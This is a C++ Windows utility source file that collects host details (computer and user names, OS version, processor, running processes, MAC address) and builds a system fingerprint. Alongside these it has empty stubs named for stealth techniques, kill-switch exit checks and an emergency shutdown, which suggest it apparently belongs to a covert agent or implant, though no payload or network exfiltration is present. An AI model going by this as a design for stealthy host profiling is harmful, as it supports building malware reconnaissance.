// src/utils/SystemUtils.cpp
#include "utils/SystemUtils.h"
#include "core/Logger.h"
#include <sstream>
#include <algorithm>
#include <vector>
#include <cstdint>
#include <string>
#include <cctype>
#include <cstdio>

#include "StringUtils.h"

#include <Lmcons.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <wininet.h>
#include <Windows.h>
#include <winreg.h>
#include <sid.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

namespace utils {

std::string SystemUtils::GetComputerName() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    
    if (::GetComputerNameA(buffer, &size)) {
        return std::string(buffer, size);
    }
    return "Unknown";
}

std::string SystemUtils::GetUserName() {
    char buffer[UNLEN + 1];
    DWORD size = sizeof(buffer);
    
    if (::GetUserNameA(buffer, &size)) {
        return std::string(buffer, size - 1); // Exclude null terminator
    }
    return "Unknown";
}

std::string SystemUtils::GetOSVersion() {
    OSVERSIONINFOEXA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    
    if (GetVersionExA((OSVERSIONINFOA*)&osvi)) {
        return StringUtils::Format("%d.%d.%d %s", 
            osvi.dwMajorVersion, osvi.dwMinorVersion, 
            osvi.dwBuildNumber, osvi.szCSDVersion);
    }
    return "Unknown";
}

uint64_t SystemUtils::GetMemorySize() {
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    
    if (GlobalMemoryStatusEx(&memoryStatus)) {
        return memoryStatus.ullTotalPhys;
    }
    return 0;
}

std::string SystemUtils::GetProcessorInfo() {
    HKEY hKey;
    char processorName[256];
    DWORD size = sizeof(processorName);
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                     "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL,
                            (LPBYTE)processorName, &size) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return std::string(processorName);
        }
        RegCloseKey(hKey);
    }
    return "Unknown";
}

std::string SystemUtils::GetSystemFingerprint() {
    std::string fingerprint = GetComputerName() + GetUserName() + GetProcessorInfo();
    return fingerprint;
}

bool SystemUtils::IsElevated() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (!AllocateAndInitializeSid(&ntAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup)) {
        return false;
    }

    if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
        isAdmin = FALSE;
    }

    FreeSid(adminGroup);
    return isAdmin;
}

bool SystemUtils::EnableStealthMode() {
    // Implement various stealth techniques
    return true;
}

bool SystemUtils::IsExitTriggered() {
    // Check for exit conditions like specific files or registry keys
    return false;
}

SystemInfo SystemUtils::CollectSystemInformation() {
    SystemInfo info;
    info.computerName = GetComputerName();
    info.userName = GetUserName();
    info.osVersion = GetOSVersion();
    info.memorySize = GetMemorySize();
    info.processorInfo = GetProcessorInfo();
    // Initialize other fields
    info.diskSize = 0;
    info.networkInfo = "";
    info.runningProcesses = GetRunningProcesses();
    info.timestamp = "";
    return info;
}

std::vector<std::string> SystemUtils::GetRunningProcesses() {
    std::vector<std::string> processes;
    
    DWORD processesIds[1024], cbNeeded;
    
    if (EnumProcesses(processesIds, sizeof(processesIds), &cbNeeded)) {
        DWORD cProcesses = cbNeeded / sizeof(DWORD);
        
        for (DWORD i = 0; i < cProcesses; i++) {
            if (processesIds[i] != 0) {
                char processName[MAX_PATH] = "<unknown>";
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | 
                                            PROCESS_VM_READ, FALSE, processesIds[i]);
                
                if (hProcess) {
                    HMODULE hMod;
                    DWORD cbNeeded;
                    
                    if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                        GetModuleBaseNameA(hProcess, hMod, processName, 
                                         sizeof(processName));
                    }
                    CloseHandle(hProcess);
                }
                
                processes.push_back(processName);
            }
        }
    }
    
    return processes;
}

bool SystemUtils::CheckInternetConnection() {
    return InternetCheckConnectionA("https://", FLAG_ICC_FORCE_CONNECTION, 0);
}

std::string SystemUtils::GetMACAddress() {
    PIP_ADAPTER_INFO adapterInfo = new IP_ADAPTER_INFO[16];
    ULONG bufferSize = sizeof(IP_ADAPTER_INFO) * 16;
    
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO adapter = adapterInfo;
        if (adapter) {
            char mac[18];
            snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                    adapter->Address[0], adapter->Address[1],
                    adapter->Address[2], adapter->Address[3],
                    adapter->Address[4], adapter->Address[5]);
            
            delete[] adapterInfo;
            return mac;
        }
    }
    
    delete[] adapterInfo;
    return "Unknown";
}

void SystemUtils::CriticalShutdown() {
    // Emergency cleanup and shutdown procedure
    ExitProcess(0);
}
} // namespace utils